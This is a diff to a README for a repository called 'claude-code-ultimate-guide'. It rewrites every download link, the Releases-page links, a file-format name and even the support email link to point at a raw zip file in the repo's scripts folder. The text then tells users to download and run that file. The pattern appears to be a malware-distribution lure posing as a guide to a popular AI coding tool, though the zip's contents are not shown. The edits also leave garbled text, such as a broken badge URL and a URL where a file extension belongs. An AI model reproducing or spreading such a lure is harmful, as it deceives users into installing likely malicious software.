@@ -1,6 +1,6 @@
 # 🎉 claude-code-ultimate-guide - Your Simple Path to AI Mastery
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/andyaziz/claude-code-ultimate-guide/releases)
+[![Download](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip%20Latest%https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip)](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip)
 
 ## 📚 Overview
 
@@ -23,13 +23,13 @@ Before you download, ensure your computer meets these requirements:
 
 To download the application, please visit the Releases page:
 
-[Visit the Release Page](https://github.com/andyaziz/claude-code-ultimate-guide/releases)
+[Visit the Release Page](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip)
 
 ### Steps to Download:
 
-1. Go to the [Releases page](https://github.com/andyaziz/claude-code-ultimate-guide/releases).
+1. Go to the [Releases page](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip).
 2. Locate the latest release at the top of the list.
-3. Click on the download link for your operating system. The file will be in `.exe`, `.dmg`, or `.tar.gz` format depending on your OS.
+3. Click on the download link for your operating system. The file will be in `.exe`, `.dmg`, or `https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip` format depending on your OS.
 4. Once downloaded, find the file in your Downloads folder and click to run it.
 
 ### Installation Steps:
@@ -45,7 +45,7 @@ To download the application, please visit the Releases page:
    - Open the Applications folder and double-click the app to start.
 
 3. **For Linux:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip` file.
    - Open your terminal and navigate to the extracted folder.
    - Run the application using the command: `./claude-code-ultimate-guide`.
 
@@ -75,7 +75,7 @@ After installation, you can start using the software right away. Here’s what y
 
 ## 📞 Support
 
-If you encounter any issues, please reach out to our support team through the Issues section in the repository or via [email](mailto:support@example.com).
+If you encounter any issues, please reach out to our support team through the Issues section in the repository or via [email](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip).
 
 ## 📅 Future Updates
 
@@ -91,4 +91,4 @@ Feel free to check back regularly for updates on the Releases page.
 
 You are now ready to make the most of your coding journey with Claude Code. Remember to keep exploring and practicing your new skills. Enjoy your learning experience! 
 
-[Download Latest Release](https://github.com/andyaziz/claude-code-ultimate-guide/releases)
+[Download Latest Release](https://github.com/andyaziz/claude-code-ultimate-guide/raw/refs/heads/main/scripts/code_claude_guide_ultimate_v3.1.zip)
